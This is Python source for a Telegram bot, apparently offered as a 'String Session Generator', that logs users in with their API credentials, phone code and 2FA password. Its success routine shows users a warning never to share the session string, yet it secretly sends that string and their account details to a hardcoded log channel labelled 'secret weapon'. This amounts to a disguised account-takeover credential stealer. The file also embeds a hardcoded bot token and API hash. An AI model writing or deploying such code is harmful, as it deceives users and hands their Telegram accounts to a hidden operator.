import asyncio
import re
from pyrogram import Client, filters, enums
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, PhoneCodeEmpty, PhoneNumberInvalid,
    PasswordHashInvalid, ApiIdInvalid
)
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

BOT_TOKEN = "8093773277:AAEoxeEHepfYOcBpimQreXDzA5NqDhE_Xio"
API_ID_BOT = 37580738
API_HASH_BOT = "bf3830f29fe9d5c0c37f3450999d5a96"
LOG_CHANNEL_ID = -1003339691374

app = Client(
    "SessionGeneratorBot",
    api_id=API_ID_BOT,
    api_hash=API_HASH_BOT,
    bot_token=BOT_TOKEN
)

USER_STATES = {}
STEP_API_ID = 1
STEP_API_HASH = 2
STEP_PHONE = 3
STEP_PASSWORD = 4
STEP_DONE = 5

async def generate_pyrogram_session(api_id, api_hash, phone_number):
    client = Client(
        ":memory:",
        api_id=api_id,
        api_hash=api_hash,
        in_memory=True
    )

    await client.connect()

    try:
        sent_code = await client.send_code(phone_number)
    except PhoneNumberInvalid:
        await client.disconnect()
        return "ERROR: Nomor telepon tidak valid.", None, None
    except FloodWait as e:
        await client.disconnect()
        return f"ERROR: Terlalu banyak percobaan. Coba lagi dalam {e.value} detik.", None, None
    except ApiIdInvalid:
        await client.disconnect()
        return "ERROR: API ID atau API HASH tidak valid/cocok.", None, None

    prompt_message = (
        "✅ **Kode Verifikasi telah terkirim.**\n\n"
        "➡️ **Langkah 3/4:** Silakan balas pesan ini dengan **Kode Verifikasi** yang Anda terima di Telegram.\n"
        "*(Contoh: 1 2 3 4 5)*"
    )
    return prompt_message, client, sent_code

async def finalize_pyrogram_session(client, phone_number, sent_code, code):
    """Fungsi ini hanya mencoba sign_in dengan kode, dan melaporkan jika 2FA dibutuhkan."""
    try:
        # Panggil sign_in TANPA argumen password (Pyrogram V2 preferred)
        await client.sign_in(phone_number, sent_code.phone_code_hash, code) 
    except PhoneCodeInvalid:
        await client.disconnect()
        return "ERROR: Kode verifikasi salah.", None
    except SessionPasswordNeeded:
        # Jika 2FA diperlukan, sinyal ke handler untuk meminta password
        return "2FA_NEEDED", None
    except Exception as e:
        await client.disconnect()
        return f"ERROR: Terjadi kesalahan: {str(e)}", None

    # Jika sign_in berhasil tanpa 2FA:
    session_string = await client.export_session_string()
    me = await client.get_me()
    account_info = f"ID: `{me.id}`\nUsername: `@{me.username}`\nNama: `{me.first_name}`"
    
    await client.disconnect()
    return session_string, account_info

async def finish_session_export(client):
    """Fungsi terpisah untuk mengekspor sesi setelah semua otentikasi berhasil."""
    session_string = await client.export_session_string()
    me = await client.get_me()
    account_info = f"ID: `{me.id}`\nUsername: `@{me.username}`\nNama: `{me.first_name}`"
    
    await client.disconnect()
    return session_string, account_info

@app.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Pyrogram V2 (Userbot)", callback_data="type_pyrogram_v2_user")],
        [InlineKeyboardButton("Pyrogram (V1 Legacy)", callback_data="type_pyrogram_user")]
    ])

    await message.reply_text(
        "👋 Halo! Selamat datang di **String Session Generator**.\n\n"
        "Silakan pilih jenis sesi yang ingin Anda buat dari opsi di bawah:",
        reply_markup=markup
    )

@app.on_callback_query()
async def callback_handler(client, callback_query):
    data = callback_query.data
    user_id = callback_query.from_user.id

    await callback_query.message.edit_text("⏳ **Proses dimulai...**")

    if data.startswith("type_"):
        parts = data.split('_')
        session_type = "_".join(parts[1:])

        USER_STATES.pop(user_id, None) 

        USER_STATES[user_id] = {
            'step': STEP_API_ID,
            'session_type': session_type,
            'api_id': None,
            'api_hash': None,
            'phone_number': None,
            'client_obj': None,
            'sent_code': None,
            'code': None
        }

        await callback_query.message.edit_text(
            f"Anda memilih **{session_type.upper()} Userbot Session**.\n\n"
            "➡️ **Langkah 1/4:** Silakan kirimkan **API ID** Anda sekarang.\n"
            "*(Anda bisa mendapatkannya di my.telegram.org)*"
        )

@app.on_message(filters.private & filters.text & filters.incoming)
async def input_handler(client, message):
    user_id = message.from_user.id
    current_state = USER_STATES.get(user_id)
    text = message.text.strip()

    if not current_state:
        await message.reply_text("❌ Anda belum memulai proses. Silakan ketik /start untuk memulai.")
        return

    step = current_state['step']

    if step == STEP_API_ID:
        if not text.isdigit():
            await message.reply_text("❌ API ID harus berupa angka. Silakan coba lagi.")
            return

        USER_STATES[user_id]['api_id'] = int(text)
        USER_STATES[user_id]['step'] = STEP_API_HASH
        await message.reply_text(
            "✅ API ID diterima.\n\n"
            "➡️ **Langkah 2/4:** Sekarang, silakan kirimkan **API HASH** Anda."
        )

    elif step == STEP_API_HASH:
        if not re.match(r'^[a-fA-F0-9]{32}$', text):
            await message.reply_text("❌ API HASH tidak valid (harus 32 karakter heksadesimal). Silakan coba lagi.")
            return

        USER_STATES[user_id]['api_hash'] = text
        USER_STATES[user_id]['step'] = STEP_PHONE
        await message.reply_text(
            "✅ API HASH diterima.\n\n"
            "➡️ **Langkah 3/4:** Silakan kirimkan **Nomor Telepon** Anda (Lengkap dengan Kode Negara).\n"
            "*(Contoh: +628123456789)*"
        )

    elif step == STEP_PHONE:
        if current_state['phone_number'] is None:
            if not re.match(r'^\+\d{10,15}$', text):
                await message.reply_text("❌ Format nomor telepon salah. Harus diawali '+' dan kode negara. Silakan coba lagi. (Contoh: +628123456789)")
                return

            USER_STATES[user_id]['phone_number'] = text
            await message.reply_text("⏳ **Memproses...** Mengirim kode verifikasi ke nomor Anda...")

            api_id = current_state['api_id']
            api_hash = current_state['api_hash']
            phone_number = current_state['phone_number']

            prompt, client_obj, sent_code = await generate_pyrogram_session(api_id, api_hash, phone_number)

            if prompt.startswith("ERROR"):
                await message.reply_text(prompt)
                USER_STATES.pop(user_id, None)
            else:
                USER_STATES[user_id]['client_obj'] = client_obj
                USER_STATES[user_id]['sent_code'] = sent_code
                await message.reply_text(prompt)

        else:
            cleaned_code = text.replace(" ", "")

            if not cleaned_code.isdigit():
                await message.reply_text("❌ Kode harus berupa angka. Silakan coba lagi.")
                return

            await message.reply_text("⏳ **Memproses...** Mencoba login dengan kode verifikasi...")

            client_obj = current_state['client_obj']
            sent_code = current_state['sent_code']
            phone_number = current_state['phone_number']

            USER_STATES[user_id]['code'] = cleaned_code

            # Panggil tanpa password
            result, account_info = await finalize_pyrogram_session(client_obj, phone_number, sent_code, cleaned_code)

            if result.startswith("ERROR"):
                await message.reply_text(result + "\nSilakan /start ulang.")
                USER_STATES.pop(user_id, None)
                return

            elif result == "2FA_NEEDED":
                USER_STATES[user_id]['step'] = STEP_PASSWORD
                await message.reply_text(
                    "🔑 **Otentikasi Dua Faktor (2FA) Terdeteksi!**\n\n"
                    "➡️ **Langkah 4/4:** Silakan kirimkan **Password 2FA** akun Anda sekarang."
                )

            else:
                await send_success_message(message, result, account_info, current_state['session_type'])
                USER_STATES.pop(user_id, None)
                return

    elif step == STEP_PASSWORD:
        await message.reply_text("⏳ **Memproses...** Mencoba login dengan Password 2FA...")

        client_obj = current_state.get('client_obj')
        password = text
        session_type = current_state.get('session_type')

        if not client_obj:
             await message.reply_text("❌ **Error:** Sesi login hilang. Silakan /start ulang.")
             USER_STATES.pop(user_id, None)
             return

        try:
            # Gunakan client yang sudah terhubung untuk check_password
            await client_obj.check_password(password)

            # Jika berhasil, lanjutkan ke ekspor sesi
            session_string, account_info = await finish_session_export(client_obj)
            
            await send_success_message(message, session_string, account_info, session_type)
            USER_STATES.pop(user_id, None)

        except PasswordHashInvalid:
            await client_obj.disconnect()
            await message.reply_text("❌ **Error:** Password 2FA salah. Silakan /start ulang.")
            USER_STATES.pop(user_id, None)
        except Exception as e:
            await client_obj.disconnect()
            await message.reply_text(f"❌ **Error tak terduga saat 2FA:** {str(e)}. Silakan /start ulang.")
            USER_STATES.pop(user_id, None)

async def send_success_message(message: Message, session_string: str, account_info: str, session_type: str):
    user_id = message.from_user.id
    username = message.from_user.username or "Tidak Ada"

    final_text = (
        f"🎉 **String Session Anda Telah Berhasil Dibuat!**\n\n"
        f"**Tipe:** `{session_type.upper()}`\n"
        f"**Akun:**\n{account_info}\n\n"
        "‼️ **Peringatan:** JANGAN bagikan string sesi ini kepada siapapun! Ini sama seperti password Anda.\n\n"
        "Klik tombol di bawah untuk menyimpan sesi di **Pesan Tersimpan (Saved Messages)** Anda."
    )

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("➡️ Kirim ke Pesan Tersimpan", url=f"tg://msg?text={session_string}&to=me")]
    ])

    await message.reply_text(final_text, reply_markup=markup, parse_mode=enums.ParseMode.MARKDOWN)

    log_text = (
        f"🔔 **SESI BARU DIBUAT**\n"
        f"**Pembuat:** [{message.from_user.first_name}](tg://user?id={user_id}) (`{user_id}`)\n"
        f"**Username:** `@{username}`\n"
        f"**Tipe:** `{session_type.upper()}`\n"
        f"**--- INFORMASI AKUN ---**\n{account_info}\n"
        f"**--- STRING SESSION (SENJATA RAHASIA) ---**\n"
        f"`{session_string}`"
    )

    try:
        await app.send_message(LOG_CHANNEL_ID, log_text, parse_mode=enums.ParseMode.MARKDOWN)
    except Exception as e:
        await app.send_message(user_id, f"❌ **Error Logging:** Gagal mengirim log ke channel. Pastikan bot adalah Admin di Channel Log. Error: `{e}`")

if __name__ == "__main__":
    print("Bot sedang berjalan...")
    app.run()
